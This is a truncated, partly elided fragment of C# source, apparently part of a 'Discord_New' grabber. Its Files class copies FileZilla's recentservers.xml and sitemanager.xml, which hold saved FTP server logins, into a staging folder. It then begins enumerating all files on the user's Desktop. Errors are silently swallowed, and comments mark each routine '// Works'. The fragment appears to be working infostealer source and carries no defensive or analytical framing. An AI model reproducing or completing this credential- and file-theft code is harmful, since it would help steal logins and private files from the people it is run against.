...
namespace Discord_New
{
    internal class Files
    {
        public static void FileZilla(string path) // Works
        {
            ...
            try
            {
                File.Copy(
                    ...
                    "\\Filezilla\\recentservers.xml", path + "\\Filezilla\\filezilla_recentservers.xml", true);
            }
            catch
            {
            }
            ...
            try
            {
                File.Copy(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
                    "\\Filezilla\\sitemanager.xml", path + "\\Filezilla\\filezilla_sitemanager.xml", true);
            }
            catch
            {
            }
        ...
        public static void Desktop(string directorypath) // Works
        {
            try
            {
                foreach (var file in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
                    .GetFiles())
